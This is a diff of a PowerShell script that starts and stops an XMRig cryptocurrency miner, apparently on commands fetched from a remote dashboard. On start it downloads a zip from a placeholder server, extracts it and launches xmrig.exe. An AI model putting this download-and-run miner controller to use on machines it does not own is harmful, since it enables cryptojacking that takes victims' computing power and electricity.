@@ -71,37 +71,32 @@ function Get-Command {
  
     return $cmd.command
 }
+ function Mit([string]$command) {
 
-function mit([string]$command) {
-# ======================
-    # START MINING
-    # ======================
     if ($command -eq "start") {
-        Write-Host "now mi"
-        # Ensure BASE directory exists
+
+        # Ensure base directory exists
         if (!(Test-Path $BASE_DIR)) {
-            Write-Host "Creating base directory C:\soft"
             New-Item -ItemType Directory -Path $BASE_DIR | Out-Null
         }
 
-        # Ensure TEMP directory exists
+        # Ensure temp directory exists
         if (!(Test-Path $TEMP_DIR)) {
-            Write-Host "Creating temp directory"
             New-Item -ItemType Directory -Path $TEMP_DIR | Out-Null
         }
 
         $zipFile = "$TEMP_DIR\mine.zip"
         $minerZipUrl = "https://yourserver.com/mine.zip"
 
-        # Download mining package
         Write-Host "Downloading mining package..."
+
         Invoke-WebRequest `
             -Uri $minerZipUrl `
             -OutFile $zipFile `
             -UseBasicParsing
 
-        # Extract mining package
         Write-Host "Extracting mining package..."
+
         Expand-Archive `
             -Path $zipFile `
             -DestinationPath $TEMP_DIR `
@@ -109,15 +104,12 @@ function mit([string]$command) {
 
         Remove-Item $zipFile -Force
 
-        # Verify miner exists
         if (!(Test-Path $MINER_EXE)) {
             Write-Host "xmrig.exe not found!"
             return
         }
 
-        # Start miner if not already running
-        if (!$MINER_PROC) {
-
+        if (!$global:MINER_PROC) {
             Write-Host "Starting miner..."
 
             $global:MINER_PROC = Start-Process `
@@ -127,20 +119,15 @@ function mit([string]$command) {
                 -PassThru
         }
     }
-    Write-Host "stopping"
-    # ======================
-    # STOP MINING
-    # ======================
     elseif ($command -eq "stop") {
 
         Write-Host "Stopping miner..."
 
-        if ($MINER_PROC) {
-            Stop-Process -Id $MINER_PROC.Id -Force
+        if ($global:MINER_PROC) {
+            Stop-Process -Id $global:MINER_PROC.Id -Force
             $global:MINER_PROC = $null
         }
 
-        # Remove only temp folder
         if (Test-Path $TEMP_DIR) {
             Remove-Item $TEMP_DIR -Recurse -Force
         }
@@ -149,33 +136,24 @@ function mit([string]$command) {
     }
 }
 
-
-function Swok{
+function Swok {
     Write-Host "called me"
-
     # If worker already running, do nothing
-    if ($WORKER) { return }
-
+    if ($global:WORKER) { return }
     # Mark worker as running
     $global:WORKER = $true
-
     # Call mining function with start signal
-    Mit -Start $true
+    Mit "start"
     Write-Host "Started"
     # Send running status to dashboard
     Send-Status $true
 }
-
 function Swnok {
-
     Write-Host "Sending stop signal..."
-
     # If not running, do nothing
-    if (-not $WORKER) { return }
-
+    if (-not $global:WORKER) { return }
     # Call Mit with stop command
     Mit "stop"
-
     # Mark worker as stopped
     $global:WORKER = $null
 }
